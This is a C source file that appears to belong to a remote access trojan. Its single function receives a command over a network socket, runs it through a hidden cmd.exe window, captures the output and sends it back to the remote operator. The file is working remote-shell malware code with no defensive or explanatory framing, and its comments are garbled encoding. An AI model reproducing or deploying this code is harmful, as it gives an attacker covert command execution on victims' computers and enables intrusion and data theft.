#include "Header.h"
#include "RatProto.h"

//////////////////////////////////////////////////////////////////////////
//��ӦCMD��Ϣ
BOOL CmdReply(SOCKET sockfd, int dwRecvSize) {
	SECURITY_ATTRIBUTES	sa;
	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = 0;
	sa.bInheritHandle = TRUE;

	HANDLE hReadPipe1, hWritePipe1;//���ܵ�ͨ��
	CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0);
	STARTUPINFO	si;//��ʼ����������
	memset(&si, 0, sizeof(si));
	GetStartupInfo(&si);
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;//���ش��ڲ�����
	si.wShowWindow = SW_HIDE;//���ش��ڲ�����
	si.hStdOutput = si.hStdError = hWritePipe1;//�ض������
	char szCmd[MAXLENGTH] = "cmd.exe /c";
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	strncat(szCmd, szRecvCmd + sizeof(RatProto), dwSize);//ƴ������
	PROCESS_INFORMATION	pInfo;
	memset(&pInfo, 0, sizeof(PROCESS_INFORMATION));
	CreateProcessA(NULL, szCmd, NULL, NULL, 1, 0, NULL, NULL, &si, &pInfo);
	memset(szCmd, 0, MAXLENGTH);
	int	dwRead;
	int nRet = PeekNamedPipe(hReadPipe1, szCmd, MAXLENGTH, (LPDWORD)&dwRead, NULL, NULL);//��ȡ�ܵ���ǰ����
	for (int i = 0; i < 5 && dwRead == 0; i++) {
		Sleep(100);
		nRet = PeekNamedPipe(hReadPipe1, szCmd, MAXLENGTH, (LPDWORD)&dwRead, NULL, NULL);
	}
	if (dwRead) {//�����������ȡ��
		nRet = ReadFile(hReadPipe1, szCmd, dwRead, (LPDWORD)&dwRead, 0);
		if (!nRet) {
			sprintf(szCmd, "%s", "CMD COMMAND EXCUTE ERROR!");
		}
	}
	dwSize = sizeof(RatProto) + strlen(szCmd) + 1;
	char* pData = (char*)malloc(dwSize);
	if (pData) {
		RatProto ratPro;
		ratPro.RatId = CMD_REPLY;
		ratPro.RatLen = dwSize;
		memcpy(pData, &ratPro, sizeof(RatProto));
		pData += sizeof(RatProto);
		sprintf(pData, "%s", szCmd);
		pData -= sizeof(RatProto);
		SendCmd(sockfd, pData, dwSize);
		free(pData);
		return TRUE;
	}
	else {
		return FALSE;
	}
}